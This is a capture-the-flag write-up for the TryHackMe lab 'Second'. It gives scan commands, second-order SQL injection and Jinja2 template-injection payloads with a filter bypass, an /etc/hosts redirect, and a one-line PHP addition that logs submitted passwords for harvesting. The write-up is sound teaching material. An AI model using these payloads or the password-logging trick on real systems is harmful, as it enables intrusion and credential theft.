# Second — Write-up

**Platform:** TryHackMe  
**Room:** Second  
**Difficulty:** Hard  
**Estimated Time:** ~180 minutes  

---

## 1. Initial Reconnaissance

### 1.1 Port Scanning

The first step was to identify exposed services. A full TCP SYN scan was performed to enumerate all open ports:

```bash
nmap -sS -n -Pn -p- --min-rate 5000 -oN full_nmap 10.67.182.235
```

Result:

```
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
```

This revealed two primary attack vectors:
- **SSH (22)** for remote access
- **HTTP (8000)** for web application exploitation

---

### 1.2 Service Enumeration

With the open ports identified, a targeted scan was performed to gather service versions and additional details:

```bash
nmap -n -Pn -sV -sC -p 22,8000 -oN nmap_version 10.67.182.235
```

The HTTP service returned:

```
Werkzeug httpd 2.0.3 (Python 3.8.10)
```

This is significant because:
- Werkzeug is commonly used with **Flask**
- Flask applications rely on **Jinja2 templates**
- This raises the hypothesis of **Server-Side Template Injection (SSTI)**

---

## 2. Web Application Enumeration

### 2.1 Directory Discovery

To map the application structure, `gobuster` was used:

```bash
gobuster dir -u http://10.67.182.235:8000 -w /usr/share/wordlists/dirb/common.txt
```

Discovered endpoints:

```
/login
/logout
/register
```

The presence of `/register` is especially relevant, as it indicates direct interaction with backend logic and a database.

---

## 3. Functional Analysis of Endpoints

### 3.1 /login

- No direct SQL Injection
- Generic error messages
- **No rate limiting**

Although brute-force is possible, it was not the main attack vector.

### 3.2 /register

During repeated registration attempts, the application returned:

```
Account already exists!
```

This behavior enables **User Enumeration**, as valid usernames can be inferred from server responses.

---

## 4. Exploitation — Second-Order SQL Injection

### 4.1 Identifying the Vector

While using the application, it was observed that the **stored username** was later reused in a **word-count feature**.

This pattern matches a **Second-Order SQL Injection**, where:
1. The payload is stored safely at insertion time
2. It is later reused in an unsafe SQL context

---

### 4.2 Proof of Concept

Registering the user:

```
user'
```

Resulted in **HTTP 500**, indicating a broken SQL query.

Registering:

```
user' OR 1=1 -- -
```

Removed the error, confirming unsafe query concatenation during later execution.

---

### 4.3 Data Extraction

After identifying the column count and reflected column, database enumeration led to credential disclosure:

```
smokey:Sm0K3s_Th3C@t
```

---

## 5. Initial Access

Using the extracted credentials:

```bash
ssh smokey@<ip>
```

Access was successfully obtained as user `smokey`.

---

## 6. Local Enumeration and Lateral Movement

### 6.1 Process Analysis

While enumerating the system, Python processes owned by another user were identified:

```bash
ps aux | grep hazel
```

This suggested an additional internal service running as `hazel`.

---

### 6.2 Source Code Audit and SSTI

The Python application contained the following pattern:

```python
render_template_string("<h1>Hi %s!!</h1>" % session['username'])
```

This is unsafe because the `%s` substitution occurs **before** Jinja rendering, allowing user-controlled input to be interpreted as a template.

---

### 6.3 SSTI Confirmation

Registering a user with:

```
{{7*7}}
```

Resulted in:

```
Hi 49!!
```

Confirming Jinja2 expression execution.

---

### 6.4 Filter Bypass

Despite a blacklist (`_`, `config`, `self`), it was possible to:
- Use `request.application`
- Encode `_` as `\x5f`
- Traverse `__globals__` → `__builtins__` → `__import__`

This allowed execution of commands such as:

```bash
id
```

Confirming execution as user `hazel`.

---

### 6.5 Reverse Shell

A reverse shell was triggered via SSTI, resulting in an interactive shell as `hazel`.

---

## 7. Privilege Escalation — “Shark”

### 7.1 Operational Context

A `note.txt` file in Hazel’s home directory stated:

```
I will be logging in to check your progress on it.
```

Combined with the lab hint (“shark”), this suggests **credential capture via traffic interception**.

---

### 7.2 Discovery of Internal PHP Site

Enumerating `/var/www` revealed:

```
/var/www/dev_site
```

Indicating an internal PHP application.

---

### 7.3 VirtualHost Enumeration

Since the site was served by Apache, VirtualHost configuration was enumerated:

```bash
grep -R "ServerName\|ServerAlias" /etc/apache2/sites-enabled/
```

Result:

```
ServerName dev_site.thm
```

This confirms **Name-Based Virtual Hosting**, where Apache selects the site based on the Host header.

---

### 7.4 /etc/hosts Permission Analysis

Checking permissions:

```bash
ls -la /etc/hosts
```

The `+` symbol indicated extended ACLs. Confirmed with:

```bash
getfacl /etc/hosts
```

Result:

```
user:hazel:rw-
```

Meaning `hazel` could modify local hostname resolution.

---

## 8. Final Attack — Re-hosting and Credential Harvesting

### 8.1 Hostname Redirection

The `/etc/hosts` file was modified to redirect:

```
<attacker_ip> dev_site.thm
```

---

### 8.2 Re-hosting the Application

On the attacker machine:
- The original `index.php` was copied
- A single line was added to capture POSTed passwords:

```php
file_put_contents('/tmp/log.txt', $_POST['password'], FILE_APPEND);
```

The server was started with:

```bash
php -S 0.0.0.0:8080
```

---

### 8.3 Credential Capture

When user `smokey` accessed the site:
- The request was transparently redirected
- The password was sent in **plaintext**
- It was successfully logged to `/tmp/log.txt`

---

## 9. Final Privilege Escalation

The captured password was reused:

```bash
su root
```

Root access was granted.

The final flag was obtained from:

```
/root/root.txt
```

---

## Attack Chain Summary

1. Web enumeration → Flask application  
2. Second-order SQL Injection → credentials  
3. SSH access as smokey  
4. SSTI → RCE as hazel  
5. Misconfigured ACL on `/etc/hosts`  
6. VirtualHost re-hosting  
7. Credential harvesting  
8. Password reuse → root access  

---

## Why This Worked

This compromise succeeded due to the **combination of multiple small weaknesses**:

- Unsafe template rendering  
- Reliance on blacklist filtering  
- Excessive ACL permissions  
- Trust in local hostname resolution  
- Password reuse between privileged users  
- Automated administrative access  

No single issue was fatal on its own.

---

## Key Takeaways

- **ACLs are as dangerous as traditional permissions**  
- **SSTI is effectively RCE**  
- **Local hostname resolution is a valid attack surface**  
- **Password reuse breaks privilege boundaries**  
- **Automation increases attack surface**  
- Security fails **in chains, not in isolation**  

---
***Written by Nelson Hirt***
---
